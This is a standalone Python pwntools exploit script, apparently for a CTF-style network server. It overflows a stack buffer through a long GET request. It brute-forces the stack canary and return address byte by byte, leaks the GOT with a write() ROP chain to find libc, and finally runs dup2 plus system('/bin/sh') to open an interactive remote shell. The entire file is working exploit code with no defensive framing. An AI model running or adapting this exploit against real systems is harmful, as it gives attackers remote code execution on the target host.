#!/usr/bin/python

from binascii import hexlify
from pwn import *
import socket
import sys

DEBUG = True

if len(sys.argv) != 3 and len(sys.argv) != 6:
    print('Usage: python exploit.py <host> <port> [chk rbp rip]')
    sys.exit(0)

host = sys.argv[1]
port = sys.argv[2]
port = int(port)

junk = b'A' * 1027

if len(sys.argv) == 3:
    def request(host, port, data):
        if DEBUG:
            print(f'Trying {data[-1]:02x} ...')
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect((host, port))
            s.sendall(data)
            try:
                return s.recv(1) != b''
            except socket.timeout:
                return False

    stack = b''

    # Leak the stack canary and frame pointer.
    for i in range(16):
        for b in range(256):
            c = bytes([ b ])
            data = b'GET /' + junk + stack + c
            if request(host, port, data):
                print(f'Stack[{i}] = {b:02x}')
                stack += c
                break
        else:
            print(f'Failed to leak the stack')
            sys.exit(1)

    # Least-significant byte of the correct return address
    stack += b'\xa1'

    # Leak the return address.
    for i in range(17, 24):
        for b in range(256):
            c = bytes([ b ])
            data = b'GET /' + junk + stack + c
            if request(host, port, data):
                print(f'Stack[{i}] = {b:02x}')
                stack += c
                break
        else:
            print(f'Failed to leak the stack')
            sys.exit(1)

    print()

    chk = int.from_bytes(stack[ 0: 8], byteorder='little')
    rbp = int.from_bytes(stack[ 8:16], byteorder='little')
    rip = int.from_bytes(stack[16:24], byteorder='little')
else:
    # Already have our initial leaks ...
    chk = int(sys.argv[3], 16)
    rbp = int(sys.argv[4], 16)
    rip = int(sys.argv[5], 16)

print(f'chk = {chk:016x}')
print(f'rbp = {rbp:016x}')
print(f'rip = {rip:016x}')
print()

stk_base = rbp - 0x0001f550
txt_base = rip - 0x000008a1
buf_base = stk_base + 0x0001f0f0
got_base = txt_base + 0x00002ee0
got_size = 288

print(f'stack base @ {stk_base:016x}')
print(f'.text base @ {txt_base:016x}')
print(f'.got  base @ {got_base:016x}')
print()

pop_rsp_gadget = txt_base + 0x0000097d  # pop rsp; pop r13; pop r14; pop r15; ret;
pop_rdi_gadget = txt_base + 0x00000983  # pop rdi; ret;
pop_rsi_gadget = txt_base + 0x00000981  # pop rsi; pop r15; ret;
pop_rdx_gadget = txt_base + 0x00000414  # pop rdx; ret;
ret_gadget     = txt_base + 0x0000001a  # ret;

write_plt_addr = txt_base + 0x00000240  # write@plt
exit_plt_addr  = txt_base + 0x00000380  # exit@plt

def leak(addr, size):
    payload  = b'GET ///\x00'           # pop r13
    payload += p64(0xaaaaaaaaaaaaaaaa)  # pop r14
    payload += p64(0xbbbbbbbbbbbbbbbb)  # pop r15

    # write(4, addr, size)
    payload += p64(pop_rdi_gadget)      # ret
    payload += p64(4)                   # pop rdi
    payload += p64(pop_rsi_gadget)      # ret
    payload += p64(addr)                # pop rsi
    payload += p64(0xcccccccccccccccc)  # pop r15
    payload += p64(pop_rdx_gadget)      # ret
    payload += p64(size)                # pop rdx
    payload += p64(write_plt_addr)      # ret

    # exit(0)
    payload += p64(pop_rdi_gadget)      # ret
    payload += p64(0)                   # pop rax
    payload += p64(exit_plt_addr)       # ret

    payload += b'A' * (1032 - len(payload))

    payload += p64(chk)
    payload += p64(rbp)

    payload += p64(pop_rsp_gadget)      # ret       <- execution starts here
    payload += p64(buf_base)            # pop rsp

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((host, port))
        s.sendall(payload)
        res = s.recv(size)

    return res

def hexdump(data):
    for i in range(0, len(data), 16):
        dump = hexlify(data[i:i+16]).decode()
        l = ' '.join(dump[:16][j:j+2] for j in range(0, len(dump[:16]), 2))
        r = ' '.join(dump[16:][j:j+2] for j in range(0, len(dump[16:]), 2))
        print(l, ' ', r)

# Dump the global offset table.
got_leak = leak(got_base, got_size)

print('GOT:')
hexdump(got_leak)
print()

printf_addr = int.from_bytes(got_leak[96:104], byteorder='little')

# The remote server is using libc.so.6 v2.27.
libc_6_base = printf_addr - 0x00064e40
system_addr = libc_6_base + 0x0004f420
dup2_addr   = libc_6_base + 0x00110950
bin_sh_addr = libc_6_base + 0x001b3d88

# The remote server is using libc.so.6 v2.37.
# libc_6_base = printf_addr - 0x00052b30
# system_addr = libc_6_base + 0x0004c920
# dup2_addr   = libc_6_base + 0x000f8220
# bin_sh_addr = libc_6_base + 0x0019604f

print(f'libc base @ {libc_6_base:016x}')
print(f'printf    @ {printf_addr:016x}')
print(f'system    @ {system_addr:016x}')
print(f'dup2      @ {  dup2_addr:016x}')
print(f'"/bin/sh" @ {bin_sh_addr:016x}')
print()

def exploit(conn):
    payload  = b'GET ///\x00'           # pop r13
    payload += p64(0xaaaaaaaaaaaaaaaa)  # pop r14
    payload += p64(0xbbbbbbbbbbbbbbbb)  # pop r15

    # dup2(4, 0)
    payload += p64(pop_rdi_gadget)      # ret
    payload += p64(4)                   # pop rdi
    payload += p64(pop_rsi_gadget)      # ret
    payload += p64(0)                   # pop rsi
    payload += p64(0xcccccccccccccccc)  # pop r15
    payload += p64(dup2_addr)           # ret

    # dup2(4, 1)
    payload += p64(pop_rdi_gadget)      # ret
    payload += p64(4)                   # pop rdi
    payload += p64(pop_rsi_gadget)      # ret
    payload += p64(1)                   # pop rsi
    payload += p64(0xcccccccccccccccc)  # pop r15
    payload += p64(dup2_addr)           # ret

    # dup2(4, 2)
    payload += p64(pop_rdi_gadget)      # ret
    payload += p64(4)                   # pop rdi
    payload += p64(pop_rsi_gadget)      # ret
    payload += p64(2)                   # pop rsi
    payload += p64(0xcccccccccccccccc)  # pop r15
    payload += p64(dup2_addr)           # ret

    # Re-align the stack ...
    payload += p64(ret_gadget)          # ret

    # system("/bin/sh")
    payload += p64(pop_rdi_gadget)      # ret
    payload += p64(bin_sh_addr)         # pop rdi
    payload += p64(system_addr)         # ret

    # exit(0)
    payload += p64(pop_rdi_gadget)      # ret
    payload += p64(0)                   # pop rax
    payload += p64(exit_plt_addr)       # ret

    payload += b'A' * (1032 - len(payload))

    payload += p64(chk)
    payload += p64(rbp)

    payload += p64(pop_rsp_gadget)      # ret       <- execution starts here
    payload += p64(buf_base)            # pop rsp

    print(f'Payload:')
    # hexdump(payload)
    print(payload)
    print()

    conn.send(payload)
    conn.interactive()
    
exploit(remote(host, port))
